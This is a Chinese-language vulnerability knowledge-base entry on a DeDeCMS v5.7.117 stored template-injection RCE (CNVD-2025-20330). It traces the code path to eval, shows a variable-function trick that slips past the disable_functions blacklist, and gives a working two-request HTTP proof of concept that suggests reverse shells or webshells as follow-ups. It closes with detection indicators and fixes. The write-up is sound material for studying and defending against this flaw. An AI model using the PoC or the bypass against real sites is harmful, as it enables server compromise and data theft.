---
id: web-php-rce-dedecms-field-tag-runphp-stored-injection
title: DeDeCMS 会员模型字段名/字段串二阶标签注入：runphp=yes 触发模板引擎 eval（CNVD-2025-20330）
type: scenario
domain: web
path: web/php/rce
technique: cms-tag-attribute-stored-template-injection
tags:
- php
- dedecms
- cms
- template-injection
- stored-injection
- second-order
- eval
- rce
- disable-functions-bypass
cve: []
severity: critical
confidence: high
status: verified
affected_versions: DeDeCMS v5.7.117
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V56
  verified_at: '2026-11-05T08:53:43+08:00'
  notes: 已对照原文核对：CNVD-2025-20330、v5.7.117、member_model_field_add/edit 入口、fieldstring 入库→LoadSource/ParseTemplet 属性注入→GetResultNP/AssignSysTag/runphp=yes→RunPHP eval 链路及 disable_functions 变量函数绕过均与 24 张图片一致；原文截图已弹 calc，PoC 未本地复跑；原文无 CVE 号。
url: /docs/web/php/rce/web-php-rce-dedecms-field-tag-runphp-stored-injection/
draft: false
kb_aliases:
- DeDeCMS 二阶注入 SSTI 组合 RCE
- DeDeCMS v5.7.117 RCE
- CNVD-2025-20330
- member_model_field_add 注入
- runphp=yes eval
- DedeTagParse 标签注入
---

## 一句话结论

DeDeCMS v5.7.117 的会员模型字段添加/编辑功能把用户可控的 `$fieldstring` 直接拼接到数据库 `dede_member_model.info` 中，而该字段随后会被 `DedeTagParse` 当作标签模板解析；攻击者存入 `<field:x itemname=... runphp=yes>PHP代码</field:x>`，再触发同名字段命中缓存，`AssignSysTag()` 即调用 `RunPHP()` 执行 `@eval($phpcode)`，实现后台到服务器命令执行（CNVD-2025-20330）。

## 原理

- **存储**：`uploads/dede/member_model_field_add.php` 在 `$action=='save'` 时先 `SELECT table, info FROM #@__member_model WHERE id='$id'` 取出 `info`，再 `$dtp = new DedeTagParse(); $dtp->SetNameSpace("field","<",">"); $dtp->LoadSource($fieldset);`。若 `$fieldname` 与解析出的任一标签名不同（首次添加新字段必然如此），走 `$oksetting = $fieldset . "\n" . stripslashes($fieldstring)`，随后 `UPDATE #@__member_model SET info='$oksetting'`。`$fieldstring` 只做了 `addslashes` 防 SQL 注入，没有做标签/HTML 过滤，于是攻击者的标签文本被持久化进 `info`。
- **解析**：`LoadSource()` 把 `info` 原文写入 `data/tplcache/<md5>.inc`，`LoadTemplate()` 在缓存不存在时调用 `ParseTemplat()`；`SetSource()` 只替换反斜杠/方括号等少量字符，`ParseAttribute()` 用 `=` 和单双引号切分属性，最后每个标签被构造成 `DedeTag` 放进 `$this->CTags`。标签名空间是 `field`，因此 `<field:xxx ...>` 会被当作字段标签。
- **触发**：`GetResultNP()` 的第一步就是 `$this->AssignSysTag()`；`AssignSysTag()` 中有一条 `if($CTag->GetAtt('runphp') == 'yes') $this->RunPHP($CTag, $i);`。`RunPHP()` 从标签内部文本（或 `source=value` 时的 TagValue）取 `$phpcode`，做少量替换后 `@eval($phpcode);`。也就是说 `runphp=yes` 是模板引擎自带的“执行 PHP 接口”，本身不是漏洞，问题在于标签内容可以由低信任的后台数据注入。
- **命中缓存/二阶**：`member_model_field_add.php` 只在 `$fieldname == strtolower($ctag->GetName())` 时 `$dtp->Assign($tagid, ...); $ok=true;`，随后 `$oksetting = $dtp->GetResultNP()`；否则更新数据。因此攻击要两步：第一次 save 把恶意标签写进 `info`（未命中，只存储）；第二次任意操作（如 delete）让 `fname` 等于标签名，命中后 `GetResultNP()` → `AssignSysTag()` → `RunPHP()` 执行。
- **命令执行绕过**：`RunPHP()` 用 `$cfg_disable_funs`（含 `phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec...`）做正则过滤，规则要求危险函数名后紧跟 `(`、`[`、`{` 等；把函数名放进变量再调用（`$a="base64_decode"; $b="system"; $b($a("Y2FsYw=="));`）即可绕过，原文最终执行 `calc`。

## 触发条件

- 目标为 DeDeCMS v5.7.117（原文版本）；
- 攻击者已获得后台权限（原文 admin/admin 默认口令进入 `/dede/`），或通过其他漏洞取得后台会话；
- 会员模型管理可新增/编辑字段（`member_model_field_add.php`、`member_model_field_edit.php` 可达）；
- `data/tplcache` 可写（默认），且 PHP 进程能执行 `eval`（未通过 Suhosin 等禁用）；
- 需要二次请求（删除/编辑字段）命中标签缓存。

## 利用步骤

1. 进入后台“会员模型管理”，对任一模型点“编辑”→“添加新字段”。
2. 字段名填 `fxxm`，提示文字/字段串位置填入恶意标签（原文通过 `fieldstring` 参数提交）。
3. 提交保存（`action=save`）：`$fieldstring` 被拼进 `info`，恶意标签写入数据库并生成/更新 tplcache。
4. 再发一次删除或编辑请求，令 `fname=fxxm`，使 `$fieldname` 与缓存标签名相等，进入 `GetResultNP()`。
5. `AssignSysTag()` 识别 `runphp=yes`，`RunPHP()` `eval` 标签内 PHP 代码，执行命令（原文弹出计算器）。
6. 将代码替换为反弹 Shell、写 Webshell、读取数据库配置等，完成持久化控制。

## PoC

第一步（存储）：

```http
POST /uploads/dede/member_model_field_add.php HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<admin-session>
Content-Type: application/x-www-form-urlencoded

action=save&id=1&dtype=textchar&fieldname=fxxm&fieldstring=%3Cfield%3Afxxm%20itemname%3D123%20runphp%3Dyes%3E%24a%3D%22base64_decode%22%3B%24b%3D%22system%22%3B%24c%3D%24a%28%22Y2FsYw%3D%3D%22%29%3B%24b%28%24c%29%3B%3C/field%3Afxxm%3E
```

解码后的 `fieldstring`：

```text
<field:fxxm itemname=123 runphp=yes>$a="base64_decode";$b="system";$c=$a("Y2FsYw==");$b($c);</field:fxxm>
```

第二步（触发，任意操作，原文用删除）：

```http
POST /uploads/dede/member_model_field_edit.php HTTP/1.1
Host: <target>
Cookie: PHPSESSID=<admin-session>
Content-Type: application/x-www-form-urlencoded

id=1&action=delete&fname=fxxm
```

原文截图显示第二个请求后目标机弹出计算器；`Y2FsYw==` 为 `calc` 的 base64，可替换为任意命令。

## 变体与关联

- 入口变体：原文称共有 6 个入口，`member_model_field_add.php` 只是其中之一；同一 `DedeTagParse` + `runphp` 机制可被其他能把可控文本写入 `info`/模板数据的后台功能触发。
- 标签变体：`global`、`include`、`foreach`、`var` 等系统标签也可组合，`runphp` 只是最直接的 eval 通道。
- 绕过变体：`$cfg_disable_funs` 是“函数名后紧跟括号”的正则黑名单，变量函数、字符串拼接、base64/回调、`ReflectionFunction` 等均可绕过；可参考 [[web-php-rce-disable-functions-ld-preload]] 与 [[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]。
- 关联：[[web-generic-ssti-smarty-direct-rce-v4-v5-bypass]]（PHP 模板引擎直接 RCE）；本场景属于“后台数据 → 模板缓存 → eval”的存储型模板注入。

## 检测与防御

- 检测：后台请求 `member_model_field_add.php`/`member_model_field_edit.php` 中出现 `<field:`、`runphp=yes`、`base64_decode`、变量函数调用等；`data/tplcache/*.inc` 中出现 `<?php` 与 `runphp`；后台出现 `fname` 与新增字段名相同的删除/编辑请求；Web 进程执行 `calc`、`cmd`、`sh` 等异常子进程。
- 修复：升级 DeDeCMS 到含修复的版本；对 `fieldstring`/`fieldname` 做严格白名单（仅允许字母数字下划线），禁止 `<`、`>`、引号、`runphp` 等标签字符；对 `info` 字段解析前做标签白名单。
- 加固：删除/修改默认 admin 口令，后台加二次认证与 IP 白名单；`disable_functions` 不能作为唯一防线（可被变量函数绕过），应同时移除模板引擎的 `runphp` 能力或对 eval 输入做语法白名单；限制 `data/tplcache` 目录写权限并监控其内容变化；部署 WAF 拦截标签注入特征。
